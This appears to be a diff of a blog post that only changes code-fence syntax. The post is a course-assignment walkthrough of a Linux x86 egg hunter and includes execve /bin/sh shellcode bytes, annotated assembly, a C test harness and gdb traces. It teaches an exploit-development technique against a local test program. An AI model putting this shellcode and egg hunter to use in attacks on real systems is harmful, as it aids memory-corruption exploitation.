@@ -53,9 +53,9 @@ The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/
 
 Here are the opcodes:
 
-```
+~~~ bash
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
-```
+~~~
 
 ### The Egghunter
 The egg hunter is responsible for searching for the shellcode in the virtual memory address space of an arbitrary process.
@@ -80,11 +80,11 @@ Compile it using these options: `gcc -fno-stack-protector -z execstack egghunter
 
 The first few instructions are responsible for clearing the `EAX` and `EBX` registers. The direction flag is also cleared to prevent the egg hunter from failing as the `scas` instruction is used. It may be possible that this flag is set by the process, although unlikely.
 
-```nasm
+~~~ nasm
 cld		
 xor eax, eax`
 xor edx, edx
-```
+~~~
 
 <br>2\. `next_page:`
 
@@ -92,18 +92,18 @@ The `next_page:` procedure is responsible for aligning the page value of the cur
 
 The first address of relevance is typically `0x8048000`, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional memory address spaces. As such, the first address that is examined is `0x0001000`.
 
-```nasm
+~~~ nasm
 next_page:
   or dx, 0xfff ;page alignment
-```
+~~~
 
 <br>2\. `increment_address:`
 
 The `increment_address:` procedure is largely responsible for incrementing the current address that is in `EDX` by `1`. Later, the value in the `EDX` is placed into `EDI` when inspected by `scas`> The purpose of this is to increment the current address in the event that the user supplied egg as not been found.
 
-```nasm
+~~~ nasm
 inc edx		
-```
+~~~
 
 <br>3\. The `access` system call
 
@@ -111,11 +111,11 @@ The `access` system call, `0x21` or `33`, simply takes the value currently in th
 
 The `EBX` register contains the value in the `EDX` register plus four. This is so that eight contiguous bytes of memory can be searched.
 
-```nasm
+~~~ nasm
 lea ebx, [edx +0x4]
 mov eax, 0x21		
 int 0x80
-```
+~~~
 
 <br>4\. `search_vas:`
 
@@ -123,17 +123,17 @@ The `search_vas:` procedure is largely responsible for comparing the `DWORD` val
 
 First, a comparison is conducted against the value currently in the `AL` register and `0xf2`.
 
-```nasm
+~~~ nasm
 cmp al, 0xf2
-```
+~~~
 
 The return value of the `access` system call is stored in `AL` and indicates if the supplied memory location is valid. If the memory location is not valid, `0xf2`, which represents the low byte of the `EFAULT` return value is stored in the `AL` register.
 
 If `0xf2` exists in `AL` the current memory location is invalid. The zero flag is set, as comparing `0xf2` by itself is `0`. This triggers the next instruction to execute.
 
- ```nasm
+ ~~~ nasm
  je next_page
- ```
+ ~~~
 
 This jumps to the `next_page` procedure. As mentioned in Step. 2, the `next_page` procedure increments to the next page value.
 
@@ -141,9 +141,9 @@ If `AL` does not contain `0xf2`, then a valid memory address has been accessed b
 
 The following instruction simply moves the egg in to the `EAX` register.
 
-```nasm
+~~~ nasm
 mov eax, 0x534B534B ;SKSK
-``` 	
+~~~ 	
 
 The reason for this is that the `EAX` register is one of the native IA-32 instructions for doing string based comparisons with `scas`. In other words, the value in the memory location currently inspected by `scas` is compared against the value in `EAX`.
 
@@ -151,22 +151,22 @@ The next instruction takes the value in `EDX`, which is a memory address, and pl
 
 In addition, the current memory address in `EDX`, and now `EDI` is currently four bytes behind the value in `EBX`, which was the memory address accessed by the `access` system call.
 
-```nasm
+~~~ nasm
 mov edi, edx
-```
+~~~
 
 
 The next instruction takes the `DWORD` stored in `EAX`, which is the egg, `0x534B534B`, and compares it against the value in the memory location referred to be the `EDI` register.
 
-```nasm
+~~~ nasm
 scasd
-```
+~~~
 
 If the value in the memory location pointed to the `EDI` register does not match the value in the `EAX` register, essentially meaning that the egg has not been found, then the zero flag will not be set. This triggers the next instruction to execute.
 
-```nasm
+~~~ nasm
 jne increment_address
-```
+~~~
 
 This jumps to the `increment_address` procedure. As mentioned in Step. 1, the `increment_address` procedure increments the value in `EDX`, which is later stored in `EDI` to the next memory address to be searched by `scasd`.
 
@@ -184,7 +184,7 @@ The zero flag is set, once again, thus bypassing the next instruction which is `
 
 As such, once `jmp edi` is executed, the process performs an unconditional jump to the memory address where the second stage exists and passes control to the shellcode.
 
-```nasm
+~~~ nasm
 cmp al, 0xf2			
 je next_page			
 mov eax, 0x534B534B
@@ -194,13 +194,13 @@ jne increment_address
 scasd				
 jne increment_address		
 jmp edi
-```
+~~~
 
 
 ### The Test Program
 As mentioned above, I have created a "test" program written in C. This uses the egg hunter to traverse the virtual memory address space for the "test" process for a user supplied egg.
 
-```c
+~~~ c
 /*
 Egg Hunter for Linux x86
 Sanjiv Kawa (@skawasec)
@@ -250,7 +250,7 @@ main()
   int (*ret)() = (int(*)())egg_hunter;
   ret();
 }
-```
+~~~
 
 The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.
 
@@ -258,7 +258,7 @@ Execution of the egg hunter can be examined in `gdb` after linking, assembling a
 
 Before this examining the egg hunter in `gdb`, it is a good idea to test if the program executes as expected.
 
-```shell
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ls
 compile.sh  egghunter.nasm  shellcode.c
 skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./compile.sh egghunter
@@ -294,12 +294,12 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./shellcode
 [+] Shellcode Length: 33
 $ exit
 skawa@ubuntu:~/Desktop/code/assignment/assignment3$
-```
+~~~
 
 ### Stepping through the execution
 A hook-stop has been defined to keep an eye on the state of the different general purpose registers, eflags as well as the contents of the `EDI` register
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment3$ gdb -q ./shellcode
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment3/shellcode...(no debugging symbols found)...done.
 (gdb) break *&egg_hunter
@@ -351,13 +351,13 @@ Dump of assembler code for function egg_hunter:
 End of assembler dump.
 0x0804a061 in egg_hunter ()
 (gdb)
-```
+~~~
 
 As mentioned, the first virtual address space of relevance is typically `0x8048000`, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional means. As such, the first address that is examined is `0x0001000`.
 
 The following disassembly just displays how the page alignment occurs. Until a valid address is located, such as `0x8048000`, the comparison of `AL` and the lower byte of the `EFAULT` flag will always result in the zero flag being set, directing the execution of the process back to the page alignment instruction `dx,0xfff` and incrementing `EBX` and `EBX` by page sizes.
 
-```nasm
+~~~ nasm
 (gdb) break *0x0804a075
 Breakpoint 2 at 0x804a075
 (gdb) c
@@ -451,11 +451,11 @@ End of assembler dump.
 
 Breakpoint 2, 0x0804a075 in egg_hunter ()
 (gdb)
-```
+~~~
 
 The following disassembly displays the first valid address that has been located by the `access` system call this is `0x8048004`.
 
-```nasm
+~~~ nasm
 (gdb) del 2
 (gdb) break *0x0804a079
 Breakpoint 3 at 0x804a079
@@ -490,11 +490,11 @@ End of assembler dump.
 
 Breakpoint 3, 0x0804a079 in egg_hunter ()
 (gdb)
-```
+~~~
 
 The `EDX` register currently hold the value `0x8048000`, which is a particular memory segment. This value is placed into `EDI` and a `scas` performs a string comparison between the `DWORD` value in `EAX`, which is the egg, `0x534b534b`, and the value in the memory address in `EDI`, which is `0x7f	0x45	0x4c	0x46`.
 
-```nasm
+~~~ nasm
 (gdb)
 $73 = 0x534b534b
 $74 = 0x8048004
@@ -524,7 +524,7 @@ Dump of assembler code for function egg_hunter:
 End of assembler dump.
 0x0804a080 in egg_hunter ()
 (gdb)
-```
+~~~
 
 As the value in the memory location, `0x8048000`, pointed to by the `EDI` register does not match the value of the egg in the `EAX` register, the zero flag will not be set. This directs the execution of the process back to the `inc edx` instruction which increments the value in the `EDX` by `1`.
 
@@ -532,7 +532,7 @@ The next memory location that is placed into `EDI` is `0x8048001` as the value i
 
 This process continues until the string comparison conducted by `scas` results in a match, thus setting the zero flag.
 
-```nasm
+~~~ nasm
 (gdb)
 $113 = 0x534b534b
 $114 = 0x8048005
@@ -562,12 +562,12 @@ Dump of assembler code for function egg_hunter:
 End of assembler dump.
 0x0804a080 in egg_hunter ()
 (gdb)
-```
+~~~
 
 
 Eventually, the value `0x804a0a0` is loaded from `EDX` into `EDI`.
 
-```nasm
+~~~ nasm
 (gdb)
 $4037 = 0x534b534b
 $4038 = 0x804a0a4
@@ -596,13 +596,13 @@ Dump of assembler code for function egg_hunter:
    0x0804a088 <+40>:	add    BYTE PTR [eax],al
 End of assembler dump.
 0x0804a07e in egg_hunter ()
-```
+~~~
 
 A `DWORD` string comparison is conducted between the value in the `EAX` register, which is the egg, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `scas` instruction.
 
 It is important to note, that after the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a0` to `0x804a0a4`.
 
-```nasm
+~~~ nasm
 (gdb)
 $4041 = 0x534b534b
 $4042 = 0x804a0a4
@@ -660,28 +660,28 @@ Dump of assembler code for function egg_hunter:
 End of assembler dump.
 0x0804a081 in egg_hunter ()
 (gdb)
-```
+~~~
 
 
 Taking a look at the source code, is is clear that the memory address `0x804a0a0` pointed to the first `EGG` at the beginning of the shellcode.
 
 After the `scas` instruction added four bytes to `0x804a0a0`, `EDI` has now been incremented to `0x804a0a4` and currently points to the second `EGG` before the start of the shellcode.
 
-```c
+~~~ c
 unsigned char second_stage[] = \
                                 EGG
                                 EGG
                                 "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                 "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                 "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack
-```
+~~~
 
 
 The same `DWORD` string comparison is conducted between the value in the `EAX` register, which is the egg, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `jmp edi` instruction.
 
 After the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a4` to `0x804a0a8` and now points to the beginning of the shellcode after the two egg identifiers.
 
-```nasm
+~~~ nasm
 $4049 = 0x534b534b
 $4050 = 0x804a0a4
 $4051 = 0x804a0a0
@@ -737,11 +737,11 @@ Dump of assembler code for function egg_hunter:
    0x0804a088 <+40>:	add    BYTE PTR [eax],al
 End of assembler dump.
 0x0804a084 in egg_hunter ()
-```
+~~~
 
 After performing an unconditional jump to the memory location referenced by the `EDI` register, the execution of the process is redirected to `0x0804a0a8` which contains the first instruction of the `exexve-stack` `/bin/sh` shellcode. Continuing the execution of the process results in the execution of `/bin/sh`.
 
-```nasm
+~~~ nasm
 (gdb)
 $4057 = 0x534b534b
 $4058 = 0x804a0a4
@@ -807,4 +807,4 @@ Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" com
 Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
 Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
 $
-```
+~~~
